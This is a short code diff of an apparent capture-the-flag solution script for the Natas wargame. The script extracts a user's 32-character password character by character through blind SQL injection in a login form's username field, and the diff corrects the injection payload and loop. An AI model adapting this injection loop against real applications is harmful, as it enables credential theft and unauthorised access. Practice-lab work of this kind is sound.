@@ -26,19 +26,19 @@ charset=string.ascii_letters+string.digits
 
 print('Start')
 
-for i in range(32): #Password is 32 characters
+for i in range(1,33): #Password is 32 characters
     for char in charset:
-        payload={'username': f'"or 1=1 and substring(password,{i+1},1)=\'{char}\''}
+        payload={'username': f'natas16" and substring(password,{i},1)=BINARY \'{char}\' -- -'}
 
-        #Sending data
+        #Sending data   
         res=session.post(url,data=payload)
 
         #Checking results
-        if "This user exists" in res.text:
+        if "This user exists." in res.text:
             final_password+=char
             print(final_password)
+            break
             
-print(final_password)
 print('End')
 ```
 
